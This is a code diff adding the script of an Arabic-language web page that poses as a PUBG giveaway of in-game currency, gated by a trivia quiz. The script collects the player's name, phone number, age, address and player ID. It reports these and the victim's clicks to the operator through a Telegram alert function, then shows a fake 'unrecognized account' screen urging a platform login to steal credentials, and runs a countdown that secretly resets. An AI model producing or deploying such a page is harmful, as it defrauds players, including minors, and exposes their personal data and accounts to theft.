+            { q: "ما السلاح الرشاش السريع الذي يتوفر حصرياً في خريطة سانهوك كبديل لـ M416؟", opts: ["QBZ", "G36C", "AUG", "AKM"], a: 0 },
+            { q: "ما هي القنبلة التي تتسبب في حرق المنطقة وتلحق ضرراً مستمراً فوق المباني؟", opts: ["قنبلة المولوتوف (Molotov Cocktail)", "قنبلة الشظايا", "القنبلة الدخانية", "القنبلة الصوتية"], a: 0 },
+            { q: "ما السلاح الفردي القناص النصف أوتوماتيكي المميز بعيار 5.56mm وسرعة طلقة فائقة؟", opts: ["Mini14", "SKS", "SLR", "Mk14"], a: 0 },
+            { q: "ما هي الوسيلة التي تمكنك من العودة للمباراة بعد الموت في الأطوار الحديثة؟", opts: ["بطاقة الاستدعاء (Recall Card)", "حقنة العلاج", "مسدس الإشعارات", "حزام الأمان"], a: 0 },
+            { q: "ما هو اللون المفتاح لمنطقة الخطر الزون الأحمر (Red Zone) على الخريطة؟", opts: ["دائرة حمراء بها قصف مدفعي عشوائي", "دائرة زرقاء", "دائرة بيضاء", "دائرة خضراء"], a: 0 },
+            { q: "ما هي فائدة المقبض الرأسي (Vertical Foregrip) عند تركيبه على السلاح؟", opts: ["تقليل الارتداد الرأسي عند الإطلاق", "تقليل الارتداد الأفقي", "زيادة سرعة التعبئة", "زيادة مدى الزوم"], a: 0 },
+            { q: "ما هي وسيلة النقل المائية الأساسية للتنقل بين الجزر في الخرائط؟", opts: ["القارب السريع (Zodiac / Speedboat)", "السيارة البرمائية", "الدرع المائي", "الطائرة"], a: 0 },
+            { q: "ما هو الحد الأقصى لرتبة السيرفر الاحترافية (Rank) التي يصل إليها اللاعبون الأوائل؟", opts: ["الغازي (Conqueror)", "الوردي (Ace Master)", "الماس (Diamond)", "التاج (Crown)"], a: 0 }
+        ];
+
+        let state = {
+            currentStep: 1,
+            selectedReward: '300 UC',
+            score: 0,
+            activeQuestions: [],
+            currentQuestionIdx: 0,
+            quizTimerVal: 20,
+            quizTimerInterval: null,
+            fullName: '',
+            phone: '',
+            age: '',
+            address: '',
+            playerID: '',
+            level: ''
+        };
+
+        function goToStep(stepNum) {
+            if (!navigator.onLine) return;
+            audio.playClick();
+            state.currentStep = stepNum;
+
+            document.querySelectorAll('.glass-card').forEach(card => card.classList.remove('active'));
+            const targetCard = document.getElementById(`cardStep${stepNum}`);
+            if (targetCard) targetCard.classList.add('active');
+
+            const btnBack = document.getElementById('btnHeaderBack');
+            if (btnBack) {
+                btnBack.style.display = (stepNum > 1) ? 'inline-flex' : 'none';
+            }
+
+            document.querySelectorAll('.step-tab').forEach(tab => {
+                const tStep = parseInt(tab.dataset.step);
+                tab.classList.remove('active');
+                if (tStep === stepNum) tab.classList.add('active');
+                if (tStep < stepNum) tab.classList.add('completed');
+            });
+
+            const fillPercent = (stepNum / 4) * 100;
+            document.getElementById('progressBarFill').style.width = `${fillPercent}%`;
+
+            if (stepNum === 2) {
+                initTriviaChallenge();
+            }
+
+            window.scrollTo({ top: 100, behavior: 'smooth' });
+        }
+
+        function goBackStep() {
+            if (state.currentStep > 1) {
+                sendTelegramAlert(`🔄 **قام المتسابق بالعودة للخطوة (${state.currentStep - 1})**`);
+                goToStep(state.currentStep - 1);
+            }
+        }
+
+        function selectReward(el, rewardTitle) {
+            document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            state.selectedReward = rewardTitle;
+            saveFormDataLocally();
+            audio.playClick();
+
+            sendTelegramAlert(`🎁 **قام المتسابق باختيار جائزة:** ${rewardTitle}`);
+        }
+
+        function initTriviaChallenge() {
+            state.score = 0;
+            document.getElementById('quizScore').innerText = '0';
+            document.getElementById('quizContainerBox').style.display = 'block';
+            document.getElementById('quizSuccessBox').style.display = 'none';
+
+            const shuffled = [...pubgTriviaBank].sort(() => 0.5 - Math.random());
+            state.activeQuestions = shuffled.slice(0, 5);
+            state.currentQuestionIdx = 0;
+            renderQuestion();
+        }
+
+        function renderQuestion() {
+            if (state.score >= 3) {
+                audio.playCorrect();
+                document.getElementById('quizContainerBox').style.display = 'none';
+                document.getElementById('quizSuccessBox').style.display = 'block';
+                sendTelegramAlert(`🧠 **اجتاز المتسابق اختبار الأسئلة بنجاح! (3/3)**`);
+                return;
+            }
+
+            const qObj = state.activeQuestions[state.currentQuestionIdx];
+            document.getElementById('questionCounter').innerText = `السؤال الحالي (${state.currentQuestionIdx + 1}):`;
+            document.getElementById('questionText').innerText = qObj.q;
+
+            const optionsContainer = document.getElementById('optionsContainer');
+            optionsContainer.innerHTML = '';
+
+            let indexedOpts = qObj.opts.map((opt, idx) => ({ text: opt, isCorrect: idx === qObj.a }));
+            indexedOpts.sort(() => 0.5 - Math.random());
+
+            indexedOpts.forEach(optItem => {
+                const btn = document.createElement('button');
+                btn.className = 'option-btn';
+                btn.innerText = optItem.text;
+                btn.onclick = () => handleAnswerClick(btn, optItem.isCorrect);
+                optionsContainer.appendChild(btn);
+            });
+
+            startQuizTimer();
+        }
+
+        function startQuizTimer() {
+            clearInterval(state.quizTimerInterval);
+            state.quizTimerVal = 20;
+            document.getElementById('quizTimer').innerText = state.quizTimerVal;
+
+            state.quizTimerInterval = setInterval(() => {
+                state.quizTimerVal--;
+                document.getElementById('quizTimer').innerText = state.quizTimerVal;
+                audio.playTick();
+
+                if (state.quizTimerVal <= 0) {
+                    clearInterval(state.quizTimerInterval);
+                    audio.playTimerEnd();
+                    replaceQuestionOnWrong();
+                }
+            }, 1000);
+        }
+
+        function handleAnswerClick(btnEl, isCorrect) {
+            clearInterval(state.quizTimerInterval);
+            const allBtns = document.querySelectorAll('.option-btn');
+            allBtns.forEach(b => b.style.pointerEvents = 'none');
+
+            if (isCorrect) {
+                btnEl.classList.add('correct');
+                audio.playCorrect();
+                state.score++;
+                document.getElementById('quizScore').innerText = state.score;
+                setTimeout(() => {
+                    state.currentQuestionIdx++;
+                    renderQuestion();
+                }, 1000);
+            } else {
+                btnEl.classList.add('wrong');
+                audio.playWrong();
+                setTimeout(() => {
+                    replaceQuestionOnWrong();
+                }, 1200);
+            }
+        }
+
+        function replaceQuestionOnWrong() {
+            const availableNew = pubgTriviaBank.filter(q => !state.activeQuestions.includes(q));
+            const randomNew = availableNew[Math.floor(Math.random() * availableNew.length)] || pubgTriviaBank[0];
+            state.activeQuestions[state.currentQuestionIdx] = randomNew;
+            renderQuestion();
+        }
+
+        function toggleHelp(helpId) {
+            audio.playClick();
+            const el = document.getElementById(helpId);
+            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function validatePersonalForm() {
+            const name = document.getElementById('inputFullName').value.trim();
+            const phone = document.getElementById('inputPhone').value.trim();
+            const age = document.getElementById('inputAge').value.trim();
+            const addr = document.getElementById('inputAddress').value.trim();
+            const pid = document.getElementById('inputPlayerID').value.trim();
+            const lvl = document.getElementById('inputLevel').value.trim();
+
+            const isNameValid = /^[\u0600-\u06FFa-zA-Z\s]{5,}$/.test(name);
+            const isPhoneValid = /^[0-9+]{7,15}$/.test(phone);
+            const isAgeValid = age !== '' && parseInt(age) >= 10;
+            const isAddrValid = addr.length >= 3;
+            const isLvlValid = lvl !== '' && parseInt(lvl) >= 1;
+
+            const isPidNotRepeated = !/^(.)\1+$/.test(pid) && pid !== "123456" && pid !== "12345678" && pid !== "123456789" && pid !== "1234567890";
+            const isPidValid = /^[0-9]{6,12}$/.test(pid) && isPidNotRepeated;
+
+            if (addr.includes("اليمن") || addr.includes("صنعاء")) {
+                if (phone.startsWith("7") && phone.length === 9) {
+                    document.getElementById('inputPhone').value = "+967" + phone;
+                }
+            }
+
+            document.getElementById('iconName').className = isNameValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+            document.getElementById('iconPhone').className = isPhoneValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+            document.getElementById('iconAge').className = isAgeValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+            document.getElementById('iconAddress').className = isAddrValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+            document.getElementById('iconPlayerID').className = isPidValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+            document.getElementById('iconLevel').className = isLvlValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+
+            const isValidAll = isNameValid && isPhoneValid && isAgeValid && isAddrValid && isPidValid && isLvlValid;
+            document.getElementById('btnNextStep3').disabled = !isValidAll;
+
+            state.fullName = name;
+            state.phone = phone;
+            state.age = age;
+            state.address = addr;
+            state.playerID = pid;
+            state.level = lvl;
+
+            if (isNameValid) {
+                contestantName = name;
+                localStorage.setItem("contestant_name", contestantName);
+            }
+
+            saveFormDataLocally();
+        }
+
+        function submitStep3Logic() {
+            const dataReport = `
+🚨 **تم تسجيل بيانات متسابق جديد!** 🚨
+
+👤 **الاسم الثلاثي:** ${state.fullName}
+📞 **رقم الهاتف:** ${state.phone}
+🎂 **العمر:** ${state.age} سنة
+📍 **العنوان:** ${state.address}
+🆔 **معرف الحساب (Player ID):** ${state.playerID}
+⭐ **مستوى الحساب:** ${state.level}
+🎁 **الجائزة المطلوبة:** ${state.selectedReward}
+            `;
+            sendTelegramAlert(dataReport);
+
+            goToStep(4);
+
+            document.getElementById('loaderPhase1').style.display = 'flex';
+            document.getElementById('unrecognizedAccountPhase').style.display = 'none';
+            document.getElementById('loaderPhase2').style.display = 'none';
+            document.getElementById('platformsPhase').style.display = 'none';
+
+            setTimeout(() => {
+                document.getElementById('loaderPhase1').style.display = 'none';
+                document.getElementById('unrecognizedAccountPhase').style.display = 'block';
+            }, 3000);
+        }
+
+        function startLoginPlatformPhase() {
+            audio.playClick();
+            sendTelegramAlert(`🔑 **ضغط المتسابق ${contestantName} على زر (تسجيل الدخول لتأكيد الملكية)**`);
+
+            document.getElementById('unrecognizedAccountPhase').style.display = 'none';
+            document.getElementById('loaderPhase2').style.display = 'flex';
+
+            setTimeout(() => {
+                document.getElementById('loaderPhase2').style.display = 'none';
+                document.getElementById('platformsPhase').style.display = 'block';
+            }, 4000);
+        }
+
+        function trackPlatformClick(platformName) {
+            sendTelegramAlert(`📲 **قام المتسابق باختيار منصة:** (${platformName}) للتأكيد التلقائي!`);
+        }
+
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 1;
+                this.speedX = Math.random() * 0.5 - 0.25;
+                this.speedY = Math.random() * 0.5 - 0.25;
+                this.color = Math.random() > 0.5 ? '#ffb703' : '#00f3ff';
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+            draw() {
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        for (let i = 0; i < 40; i++) particles.push(new Particle());
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.update();
+                p.draw();
+            });
+            requestAnimationFrame(animateParticles);
+        }
+
+        function startCountdown() {
+            let totalSeconds = 3600 * 24 * 3;
+            setInterval(() => {
+                totalSeconds--;
+                if (totalSeconds < 0) totalSeconds = 3600 * 24 * 3;
+                let hrs = Math.floor(totalSeconds / 3600);
+                let mins = Math.floor((totalSeconds % 3600) / 60);
+                let secs = totalSeconds % 60;
+                document.getElementById('countdownTimer').innerText = 
+                    `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
